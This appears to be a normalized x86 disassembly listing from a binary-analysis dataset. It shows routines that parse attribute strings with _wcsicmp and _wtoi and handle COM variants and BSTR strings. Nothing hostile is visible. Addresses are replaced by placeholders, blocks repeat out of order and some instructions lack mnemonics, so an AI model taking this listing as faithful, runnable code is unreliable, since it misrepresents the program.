test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_43b470
push ebp
mov ebp esp
push 0xffffffff
push sub_44b8a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x58 ]
cmp [ ecx - 0xc ] 0x0
mov ebx [ ecx - 0x10 ]
lea edi [ esi + 0x58 ]
lea eax [ ecx - 0x10 ]
je r-xdata
mov ebx [ ebp + 0xc ]
push r--data
push ebx
call sub_428960
test eax eax
js r-xdata
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
lea eax [ esi + 0x48 ]
push eax
call [ SetRectEmpty@IAT ]
mov edi [ edi ]
mov ecx [ ebp + 0x8 ]
push edi
push ecx
lea ecx [ ebp - 0x1c ]
call sub_428d70
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ esi + 0x48 ] edx
mov edx [ ebp - 0x10 ]
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] ecx
mov [ esi + 0x54 ] edx
jmp r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
lea edi [ esi + 0x98 ]
lea eax [ ebp + 0xc ]
call sub_401760
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
push r--data
push ebx
lea edi [ ebp + 0xc ]
call sub_428960
mov ebx eax
test ebx ebx
js r-xdata
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
add eax 0x10
mov [ edi ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ edi ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
push 0x80070057
call sub_402d00
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43b5c0
push ebx
push edi
mov edi [ _wcsicmp@IAT ]
push r--data
push esi
xor ebx ebx
call edi
add esp 0x8
test eax eax
jne r-xdata
push r--data
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
retn
push r--data
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax 0x2
pop ebx
retn
push r--data
push esi
call edi
add esp 0x8
test eax eax
mov eax 0x4
je r-xdata
pop edi
mov eax 0x3
pop ebx
retn
pop edi
pop ebx
retn
mov eax ebx
sub_43b630
push ebp
mov ebp esp
push 0xffffffff
push sub_447740
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_43b6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_44b870
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp esi ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
mov edx [ eax ]
mov edx [ edx + 0x44 ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call edx
mov eax [ ebp - 0x18 ]
cmp eax ebx
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
mov [ ebp - 0x10 ] ebx
call eax
xor esi esi
mov [ ebp - 0x28 ] esi
cmp [ ebp - 0x24 ] ebx
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
mov cl [ ecx + 0xaa ]
mov [ esi + 0xaa ] cl
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push esi
push eax
mov eax [ ecx + 0x28 ]
call eax
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
lea ecx [ ebp - 0x50 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x50 ]
push ecx
push eax
call edx
mov eax [ ebp - 0x20 ]
push eax
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
inc esi
mov [ ebp - 0x28 ] esi
cmp esi [ ebp - 0x24 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x50 ]
push ecx
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x20 ]
push edx
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x8
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_402a00
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x48 ]
lea edx [ ebp + 0xc ]
push edx
call sub_402a00
mov [ ebp - 0x4 ] 0x8
lea edi [ ebp - 0x1c ]
call sub_401ac0
mov eax [ ebp - 0x1c ]
push r--data
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x8 ] ebx
mov eax [ edi ]
setne cl
movzx edx cl
mov ecx [ edi + 0x4 ]
push edx
mov esi rw-data
call sub_427c30
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0xa0 ] eax
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
sub eax 0x10
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ ebp - 0x1c ]
mov edx r--data
mov ecx eax
mov edi [ ebp + 0x10 ]
add edi 0xc
jmp r-xdata
push edi
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
lea eax [ ebp + 0xc ]
call sub_401760
mov edx r--data
mov ecx eax
mov edi [ ebp + 0x10 ]
add edi 0xc
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edx r--data
mov ecx eax
lea esp [ esp ]
mov ecx [ ebp + 0xc ]
push ecx
lea esi [ ebp - 0x30 ]
call sub_429670
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x10 ]
mov [ edx + 0x1c ] ecx
mov [ edx + 0x20 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edx
push eax
lea ecx [ ebp - 0x60 ]
call sub_428d70
mov edx [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x28 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x2c ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0x30 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov edi edi
mov eax [ ebp + 0xc ]
push r--data
push eax
mov esi eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
call sub_43b5c0
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x34 ] eax
jmp r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx r--data
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
xor edx edx
cmp eax ebx
mov eax [ ebp + 0x10 ]
sete dl
mov [ eax + 0x38 ] edx
jmp r-xdata
cmp dx bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
xor eax eax
xor edx edx
cmp eax ebx
mov eax [ ebp + 0x10 ]
sete dl
mov [ eax + 0x38 ] edx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov edx r--data
mov ecx eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx r--data
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov edx [ ebp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
xor ecx ecx
cmp eax ebx
sete cl
mov [ edx + 0x3c ] ecx
jmp r-xdata
cmp dx bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov edx [ ebp + 0x10 ]
xor ecx ecx
xor eax eax
cmp eax ebx
sete cl
mov [ edx + 0x3c ] ecx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov edx r--data
mov ecx eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx r--data
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov edx [ ebp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
xor ecx ecx
cmp eax ebx
sete cl
mov [ edx + 0x40 ] ecx
jmp r-xdata
cmp dx bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov edx [ ebp + 0x10 ]
xor ecx ecx
xor eax eax
cmp eax ebx
sete cl
mov [ edx + 0x40 ] ecx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov edx r--data
mov ecx eax
mov edi [ ebp + 0x10 ]
add edi 0x44
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov edx r--data
mov ecx eax
mov esi [ ebp + 0x10 ]
lea edi [ esi + 0x58 ]
lea eax [ ebp + 0xc ]
call sub_401760
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea ecx [ ebp - 0x40 ]
call sub_428d70
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x38 ]
mov [ esi + 0x48 ] edx
mov edx [ ebp - 0x34 ]
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] ecx
mov [ esi + 0x54 ] edx
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0xc ]
cmp ecx ebx
jle r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
movzx ecx [ eax ]
add ecx 0xffffffd0
cmp cx 0x9
ja r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0xc ]
cmp ecx ebx
jle r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov edi [ ebp + 0x10 ]
add edi 0x68
jmp r-xdata
push eax
call [ _wtoi@IAT ]
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov [ ecx + 0x60 ] eax
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
movzx ecx [ eax ]
add ecx 0xffffffd0
cmp cx 0x9
ja r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
push eax
call [ _wtoi@IAT ]
mov edx [ ebp + 0x10 ]
add esp 0x4
mov [ edx + 0x64 ] eax
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov edx r--data
mov ecx eax
mov eax [ ebp + 0xc ]
push eax
call [ _wtoi@IAT ]
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov [ ecx + 0x94 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov edi edi
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x18 ] bl
jne r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx r--data
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ebx [ ebx ]
mov esi [ ebp + 0x10 ]
lea edi [ esi + 0x10 ]
lea eax [ ebp + 0xc ]
call sub_401760
mov edx [ ebp + 0xc ]
mov eax [ edx - 0xc ]
lea ecx [ eax + eax ]
call sub_428210
mov [ esi + 0x14 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp eax ebx
setne dl
mov [ esi + 0x19 ] dl
jmp r-xdata
cmp dx bx
je r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
xor eax eax
cmp eax ebx
setne dl
mov [ esi + 0x19 ] dl
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov edx r--data
mov ecx eax
lea ebx [ ebx ]
mov eax [ ebp + 0xc ]
push eax
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x70 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov edx r--data
mov ecx eax
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x80 ] eax
mov [ ecx + 0x84 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov eax [ ebp + 0xc ]
push eax
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x74 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ebx [ ebx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x7c ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x84 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x8c ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ebx [ ebx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x78 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x88 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov edx [ ebp + 0xc ]
push edx
call sub_429560
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x90 ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov edx [ ebp + 0xc ]
mov esi [ _wcsicmp@IAT ]
push r--data
push edx
call esi
add esp 0x8
test eax eax
jne r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov ecx [ ebp + 0xc ]
push r--data
push ecx
call esi
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax + 0xaa ] bl
jmp r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
mov edi edi
mov eax [ ebp + 0xc ]
mov ecx r--data
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx + 0xaa ] 0x1
jmp r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
mov ecx [ ebp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
cmp eax ebx
sete al
mov [ ecx + 0xa9 ] al
jmp r-xdata
cmp dx bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
mov edx r--data
mov ecx eax
lea ecx [ ecx ]
mov eax [ ebp + 0xc ]
mov ecx r--data
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp eax ebx
sete al
mov [ ecx + 0xa9 ] al
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp eax ebx
mov eax [ ebp + 0x10 ]
sete dl
mov [ eax + 0xab ] dl
jmp r-xdata
cmp dx bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
mov edx r--data
mov ecx eax
nop
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push edx
call sub_43cc80
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov si [ ecx + 0x2 ]
cmp si [ edx + 0x2 ]
jne r-xdata
xor eax eax
cmp eax ebx
mov eax [ ebp + 0x10 ]
sete dl
mov [ eax + 0xab ] dl
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov si [ ecx ]
cmp si [ edx ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
cmp si bx
je r-xdata
cmp ecx ebx
jne r-xdata
add ecx 0x4
add edx 0x4
cmp si bx
jne r-xdata
add eax 0x4
add ecx 0x4
cmp dx bx
jne r-xdata
mov edx r--data
mov ecx eax
cmp [ ebp - 0x10 ] ebx
jne r-xdata
